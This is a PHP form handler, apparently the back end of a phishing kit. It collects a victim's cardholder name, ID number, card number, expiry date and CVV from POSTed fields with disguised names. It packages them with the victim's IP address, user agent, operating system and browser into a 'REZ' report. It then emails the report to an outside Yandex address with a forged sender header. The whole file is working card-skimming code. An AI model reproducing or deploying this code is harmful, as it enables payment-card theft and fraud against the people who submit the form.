<?php

session_start();
include('functions.php');


if(isset($_POST['ism']) && isset($_POST['hawia']) && isset($_POST['zebi']) && isset($_POST['sorm']) && isset($_POST['3os']) ){
    $data = new stdclass();
    if(!empty($_POST['ism']) && !empty($_POST['hawia']) && !empty($_POST['zebi']) && !empty($_POST['sorm']) && !empty($_POST['3os']) ){
        $data->name = $_POST['ism'];
        $data->id = $_POST['hawia'];
        $cc = $data->cc = $_POST['zebi'];
        $data->exp = $_POST['sorm'];
        $data->ccv = $_POST['3os'];

            $data->statut = true;
            $date = date("d M, Y");
            $time = date("g:i a");
            $date = trim($date.", Time : ".$time);  
            $ip = $_SESSION['ip_address'];
            $message  = "#----------------+ [ NAV REZ ] +----------------#\n";
            $message .= "#---------------++==[ $ FLOUS $ ]==++-------------#\n";
            $message .= "Moula CC 		: ".$data->name."\n";
            $message .= "ID Mte3o 		: ".$data->id."\n";
            $message .= "CC	: ".$data->cc."\n";
            $message .= "Exp 		: ".$data->exp."\n";
            $message .= "CCV	: ".$data->ccv."\n";
            $message .= "#---------------++==============++-------------#\n";
            $message .= "Client IP	: ".$_SESSION['ip_address']."\n";
            $message .= "Agent		  : ".$_SESSION['user_agent']."\n";
            $message .= "#---------------++==============++-------------#\n";
            $message .= "Sys		  : ".$_SESSION['sys_os']."\n";
            $message .= "Browser	  : ".$_SESSION['sys_br']."\n";
            $message .= "Date		    : ".$date."\n";
            $message .= "whatismyip	: http://ip-score.com/checkip/".$_SESSION['ip_address']."\n";
            $message .= "#----------------+ [ NAV REZ ] +----------------#\n";
            $subject  = "[$data->name] - [$data->id] - [ $ip ]";
            $headers  = "From:$data->name <hexocrypt@hexodev.xyz>\r\n";
            mail("hexocrypt@yandex.ru",$subject,$message,$headers);
    }
    else{
        $data->statut = false;
    }
}
else{
    $data = new stdclass();
    $data->statut = false;
}

echo json_encode($data);






